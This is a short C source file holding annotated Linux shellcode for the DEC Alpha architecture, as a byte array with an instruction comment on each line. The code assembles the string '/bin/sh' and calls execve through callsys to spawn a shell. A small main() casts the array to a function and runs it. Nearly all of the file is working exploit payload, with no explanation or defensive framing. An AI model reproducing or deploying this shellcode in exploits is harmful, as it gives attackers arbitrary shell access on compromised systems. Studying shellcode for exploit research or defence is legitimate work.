/* 
 * shellcode-orig-linux-alpha.c
 * Created: Mon Oct 17 10:39:56 2016 by tek@wiw.org
 * Revised: Mon Oct 17 10:39:56 2016 (pending)
 * Copyright 2016 Julian E. C. Squires (tek@wiw.org)
 * This program comes with ABSOLUTELY NO WARRANTY.
 * $Id$
 * 
 */

unsigned char shellcode[] = {
    0xE0, 0xFF, 0xDE, 0x23,             /* lda sp, -32(sp) */
    0x00, 0x04, 0xFF, 0x47,             /* bis zero, zero, v0 */
    0xF0, 0xFF, 0x1E, 0xB4,             /* stq v0, -16(sp) */

    0x00, 0x14, 0x0D, 0x44,             /* bis v0, 0x68, v0 */
    0x20, 0x17, 0x01, 0x48,             /* sll v0, 8, v0 */
    0x00, 0x74, 0x0E, 0x44,             /* bis v0, 0x73, v0 */
    0x20, 0x17, 0x01, 0x48,             /* sll v0, 8, v0 */
    0x00, 0xF4, 0x05, 0x44,             /* bis v0, 0x2F, v0 */
    0x20, 0x17, 0x01, 0x48,             /* sll v0, 8, v0 */
    0x00, 0xD4, 0x0D, 0x44,             /* bis v0, 0x6E, v0 */
    0x20, 0x17, 0x01, 0x48,             /* sll v0, 8, v0 */
    0x00, 0x34, 0x0D, 0x44,             /* bis v0, 0x69, v0 */
    0x20, 0x17, 0x01, 0x48,             /* sll v0, 8, v0 */
    0x00, 0x54, 0x0C, 0x44,             /* bis v0, 0x62, v0 */
    0x20, 0x17, 0x01, 0x48,             /* sll v0, 8, v0 */
    0x00, 0xF4, 0x05, 0x44,             /* bis v0, 0x2F, v0 */

    0xF8, 0xFF, 0x1E, 0xB4,             /* stq v0, -8(sp) */
    0xF8, 0xFF, 0x1E, 0x22,             /* lda a0, -8(sp) */
    0xE8, 0xFF, 0x1E, 0xB6,             /* stq a0, -24(sp) */
    0xF0, 0xFF, 0x5E, 0x22,             /* lda a2, -16(sp) */
    0xE8, 0xFF, 0x3E, 0x22,             /* lda a1, -24(sp) */
    0x00, 0x74, 0xE7, 0x47,             /* bis zero, 0x3B, v0 */
    0x83, 0x00, 0x00, 0x00              /* callsys */
};

int main(void)
{
    (*(void(*)(void))shellcode)();
}

/* EOF shellcode-orig-linux-alpha.c */
